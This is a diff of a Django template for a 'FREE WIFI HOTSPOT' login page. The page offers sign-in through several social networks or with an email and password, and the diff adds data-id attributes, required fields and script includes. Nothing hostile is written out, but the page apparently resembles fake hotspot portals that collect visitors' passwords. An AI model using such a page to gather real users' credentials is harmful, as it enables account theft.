@@ -3,48 +3,71 @@
 <html lang="ru">
 
 <head>
-	<meta charset="utf-8">
-	<title>Титул документа</title>
-	<link rel="stylesheet" href="{% static 'my.css' %}">
+    <meta charset="utf-8">
+    <title>Титул документа</title>
+    <link rel="stylesheet" href="{% static 'my.css' %}">
 </head>
 
 <body>
-	<div class="center">
-		<span class="title">FREE WIFI HOTSPOT</span>
-		<div class="block">
-			<div class="login">Log in</div>
-			<div class="swift">Swifly Sing In With</div>
+<div class="center">
+    <span class="title">FREE WIFI HOTSPOT</span>
+    <div class="block">
+        <div class="login">Log in</div>
+        <div class="swift">Swifly Sing In With</div>
 
-			<div>
-				<div class="facebook focus inline"><img src="{% static 'img/f.png' %}" alt="">Facebook</div>
-				<div class="twitter focus inline"><img src="{% static 'img/tw2.png' %}" alt="">Twitter</div>
-			</div>
+        <div>
+            <div class="facebook focus inline" data-id="facebook">
+                <img src="{% static 'img/f.png' %}" alt="">Facebook
+            </div>
+            <div class="twitter focus inline" data-id="twitter">
+                <img src="{% static 'img/tw2.png' %}" alt="">Twitter
+            </div>
+        </div>
 
-			<div>
-				<div class="google focus inline"><img src="{% static 'img/g.png' %}" alt="">Google</div>
-				<div class="vk focus inline"><img src="{% static 'img/vk.png'%}" alt="">VKontakte</div>
-			</div>
-			<div>
-				<div class="insta focus inline"><img src="{% static 'img/insta.png' %}" alt="">Instagram</div>
-				<div class="ok focus inline"><img src="{% static 'img/o.png' %}" alt="">Одноклассники</div>
-			</div>
+        <div>
+            <div class="google focus inline" data-id="google">
+                <img src="{% static 'img/g.png' %}" alt="">Google
+            </div>
 
-			<div class="swift">Or Use Your Email:</div>
-			<form action="#" method="POST">
-                {% csrf_token %}
-				<div class="email relative" id="email" style="width:350px"><input type="email" name="email"></div>
-				<div class="email relative" id="pass" style="width:330px"><input type="password" name="pass"></div>
-				<input type="submit" name="" value="" id="submit">
-				<label for="submit">
-					<p>CONNECT</p>
-				</label>
-			</form>
-		</div>
-<div style="color:white;text-align:center;">Designed by WEZOM-studio 2007 (c).</div>
-	</div>
+            <div class="vk focus inline" data-id="vk">
+                <img src="{% static 'img/vk.png' %}" alt="">VKontakte
+            </div>
+
+        </div>
+        <div>
+            <div class="insta focus inline" data-id="insta">
+                <img src="{% static 'img/insta.png' %}" alt="">Instagram
+            </div>
+            <div class="ok focus inline" data-id="ok">
+                <img src="{% static 'img/o.png' %}" alt="">Одноклассники
+            </div>
+        </div>
+
+        <div class="swift">Or Use Your Email:</div>
+        <form action="#" method="POST">
+            {% csrf_token %}
+            <div class="email relative" id="email" style="width:350px">
+                <input type="email" name="email" required>
+            </div>
+            <div class="email relative" id="pass" style="width:330px">
+                <input type="password" name="pass" required>
+            </div>
+            <input type="submit" name="" value="" id="submit">
+            <label for="submit">
+                <p>CONNECT</p>
+            </label>
+        </form>
+    </div>
+    <div style="color:white;text-align:center;">Designed by WEZOM-studio 2007 (c).</div>
+</div>
 
 
+<script src="http://code.jquery.com/jquery-3.3.1.min.js"
+        integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8="
+        crossorigin="anonymous">
+</script>
 
+<script src="{% static 'social_net.js' %}"></script>
 
 </body>
 
